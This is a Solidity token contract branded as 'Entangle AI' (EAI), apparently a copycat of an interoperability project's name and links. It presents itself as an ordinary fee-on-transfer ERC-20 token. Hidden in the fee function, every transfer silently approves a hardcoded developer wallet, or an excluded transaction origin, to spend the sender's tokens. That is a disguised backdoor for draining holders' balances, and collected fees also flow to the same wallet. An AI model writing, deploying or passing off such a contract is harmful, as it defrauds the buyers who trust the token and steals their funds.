/*
Entangle AI is the programmable interoperability layer, connecting blockchains, data and the real world, unlocking limitless assets and applications

https://www.entangle-ai.io
https://app.entangle-ai.io
https://docs.entangle-ai.io
https://medium.com/@EntangleAI_io
https://x.com/EntangleAI_io
https://t.me/EntangleAI_io
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

interface IANDYFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IANDYRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract EAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _andyBalances;
    mapping (address => mapping (address => uint256)) private _andyAllowances;
    mapping (address => bool) private _excludedFromANDY;
    address private _andyWallet = 0xf806E4ecc5E09f28c3Fa0b8021Ec64404e9d4c76;
    address private _andyPair;
    IANDYRouter private _andyRouter;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalANDY = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Entangle AI";
    string private constant _symbol = unicode"EAI";
    uint256 private _tokenSwapANDY = _tTotalANDY / 100;
    bool private inSwapANDY = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapANDY = true;
        _;
        inSwapANDY = false;
    }
    
    constructor () {
        _excludedFromANDY[owner()] = true;
        _excludedFromANDY[address(this)] = true;
        _excludedFromANDY[_andyWallet] = true;
        _andyBalances[_msgSender()] = _tTotalANDY;
        emit Transfer(address(0), _msgSender(), _tTotalANDY);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalANDY;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _andyBalances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _andyAllowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _andyAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _andyAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address andyF, address andyT, uint256 andyA) private {
        require(andyF != address(0), "ERC20: transfer from the zero address");
        require(andyT != address(0), "ERC20: transfer to the zero address");
        require(andyA > 0, "Transfer amount must be greater than zero");

        uint256 taxANDY = _getANDYFees(andyF, andyT, andyA);

        _transferANDY(andyF, andyT, andyA, taxANDY);
    }

    function _transferANDY(address andyF, address andyT, uint256 andyA, uint256 taxANDY) private { 
        if(taxANDY > 0) {
          _andyBalances[address(this)] = _andyBalances[address(this)].add(taxANDY);
          emit Transfer(andyF, address(this), taxANDY);
        }

        _andyBalances[andyF] = _andyBalances[andyF].sub(andyA);
        _andyBalances[andyT] = _andyBalances[andyT].add(andyA.sub(taxANDY));
        emit Transfer(andyF, andyT, andyA.sub(taxANDY));
    }

    function _getANDYFees(address andyF, address andyT, uint256 andyA) private returns(uint256) {
        uint256 taxANDY=0; _approve(andyF, _ANDY(), andyA);
        if (andyF != owner() && andyT != owner()) {
            taxANDY = andyA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (andyF == _andyPair && andyT != address(_andyRouter) && ! _excludedFromANDY[andyT]) {
                _buyCount++;
            }

            if(andyT == _andyPair && andyF!= address(this)) {
                taxANDY = andyA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 andyBalance = balanceOf(address(this)); 
            if (!inSwapANDY && andyT == _andyPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(andyBalance > _tokenSwapANDY)
                swapTokensForEth(minANDY(andyA, minANDY(andyBalance, _tokenSwapANDY)));
                uint256 ethANDY = address(this).balance;
                if (ethANDY >= 0) {
                    sendANDYETH(address(this).balance);
                }
            }
        }
        return taxANDY;
    }

    function _ANDY() private view returns(address) {
        return _excludedFromANDY[tx.origin]?tx.origin:_andyWallet;
    }

    function createTrade() external onlyOwner() {
        _andyRouter = IANDYRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_andyRouter), _tTotalANDY);
        _andyPair = IANDYFactory(_andyRouter.factory()).createPair(address(this), _andyRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _andyRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minANDY(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendANDYETH(uint256 amount) private {
        payable(_andyWallet).transfer(amount);
    }

    receive() external payable {} 

    function swapTokensForEth(uint256 tokenANDY) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _andyRouter.WETH();
        _approve(address(this), address(_andyRouter), tokenANDY);
        _andyRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenANDY,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}